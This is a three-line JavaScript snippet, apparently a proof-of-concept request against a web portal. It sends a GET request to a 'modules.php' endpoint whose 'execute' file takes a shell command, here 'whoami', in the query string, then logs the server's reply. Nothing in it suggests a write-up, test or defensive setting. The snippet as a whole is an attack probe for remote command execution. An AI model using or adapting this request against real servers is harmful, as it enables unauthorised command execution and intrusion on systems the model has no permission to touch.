fetch('/sede/modules.php?mod=portal&file=execute&cmd=whoami', { method: 'GET' })
  .then(response => response.text())
  .then(data => console.log(data));
